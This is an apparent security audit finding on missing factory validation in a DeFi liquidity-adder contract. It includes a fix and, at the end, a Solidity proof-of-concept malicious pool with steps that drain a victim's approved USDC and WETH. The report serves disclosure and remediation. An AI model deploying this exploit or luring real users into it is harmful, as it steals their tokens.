### Title
Missing factory pool validation in `MetricOmmPoolLiquidityAdder` allows a malicious pool to drain user-approved tokens — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address and uses it to settle a token-pull callback without ever verifying the address against the factory registry. A malicious pool contract can exploit this to drain up to `maxAmountToken0` / `maxAmountToken1` of any ERC-20 tokens the victim has approved to the adder.

---

### Finding Description

`MetricOmmSwapRouterBase` — the base of the swap router — validates every pool address against the factory before use: [1](#0-0) 

```solidity
function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
}
```

It calls this guard in every context-setting path: [2](#0-1) 

`MetricOmmPoolLiquidityAdder` has **no factory reference at all** — its constructor only takes `weth`: [3](#0-2) 

The NatSpec on the contract explicitly acknowledges the gap: [4](#0-3) 

> *"The caller is responsible for supplying a legitimate pool address … This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."*

The internal `_addLiquidity` flow stores the caller-supplied pool in transient storage and immediately calls `addLiquidity` on it: [5](#0-4) 

The callback `metricOmmModifyLiquidityCallback` then:

1. Checks only that `msg.sender == expectedPool` — which is the attacker-controlled address stored in step above.
2. Fetches token addresses from `IMetricOmmPool(msg.sender).getImmutables()` — fully attacker-controlled.
3. Calls `pay(token0, payer, msg.sender, amount0Delta)` — pulling tokens from the victim to the malicious pool. [6](#0-5) 

The `pay` helper in `PeripheryPayments` executes `safeTransferFrom(payer, recipient, value)` when `payer != address(this)`: [7](#0-6) 

---

### Impact Explanation

Any user who has granted a token allowance to `MetricOmmPoolLiquidityAdder` and is directed (via a malicious UI, phishing link, or social engineering) to call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-controlled pool address will lose up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 — whatever the malicious pool's `getImmutables()` returns. The loss is bounded only by the victim's own slippage caps, not by any protocol-level guard. This is a direct loss of user principal with no recovery path.

---

### Likelihood Explanation

Medium. The attack requires the victim to interact with a malicious pool address. This is achievable through a spoofed frontend, a malicious referral link, or a counterfeit pool that mimics a legitimate one (same token pair, plausible address). The `MetricOmmSimpleRouter` already demonstrates that factory validation is the correct mitigation — its absence in `MetricOmmPoolLiquidityAdder` is an inconsistency that a sophisticated attacker will notice and exploit.

---

### Recommendation

Add a factory address to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and validate every pool before use:

```solidity
// In constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

// In _addLiquidity and the probe branch of addLiquidityWeighted:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

Remove or update the NatSpec disclaimer once the guard is in place.

---

### Proof of Concept

```solidity
// MaliciousPool.sol
contract MaliciousPool {
    address immutable token0;   // e.g. USDC
    address immutable token1;   // e.g. WETH
    address immutable adder;

    constructor(address _token0, address _token1, address _adder) {
        token0 = _token0; token1 = _token1; adder = _adder;
    }

    // Implements IMetricOmmPoolActions.addLiquidity
    function addLiquidity(
        address, uint80, LiquidityDelta calldata,
        bytes calldata callbackData, bytes calldata
    ) external returns (uint256, uint256) {
        // Immediately call back with KIND_PAY and max amounts
        IMetricOmmModifyLiquidityCallback(adder)
            .metricOmmModifyLiquidityCallback(1000e6, 1e18, callbackData);
        return (1000e6, 1e18);
    }

    // Implements IMetricOmmPool.getImmutables
    function getImmutables() external view returns (PoolImmutables memory) {
        return PoolImmutables({ token0: token0, token1: token1, /* ... */ });
    }
}

// Attack:
// 1. Victim approves MetricOmmPoolLiquidityAdder for USDC and WETH.
// 2. Attacker deploys MaliciousPool(USDC, WETH, adder).
// 3. Victim is tricked into calling:
adder.addLiquidityExactShares(
    maliciousPool,
    victim,          // owner
    0,               // salt
    deltas,
    1000e6,          // maxAmountToken0 — victim's USDC cap
    1e18,            // maxAmountToken1 — victim's WETH cap
    ""
);
// 4. _addLiquidity sets pay context: pool=maliciousPool, payer=victim, max0=1000e6, max1=1e18
// 5. Calls maliciousPool.addLiquidity(...)
// 6. MaliciousPool calls metricOmmModifyLiquidityCallback(1000e6, 1e18, KIND_PAY)
// 7. Callback: msg.sender==expectedPool ✓, amounts≤max ✓, token0/token1 from getImmutables()
// 8. pay(USDC, victim, maliciousPool, 1000e6) → safeTransferFrom(victim, maliciousPool, 1000e6)
// 9. pay(WETH, victim, maliciousPool, 1e18)  → safeTransferFrom(victim, maliciousPool, 1e18)
// Victim loses 1000 USDC + 1 WETH.
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L37-37)
```text
  constructor(address weth) PeripheryPayments(weth) {}
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-178)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
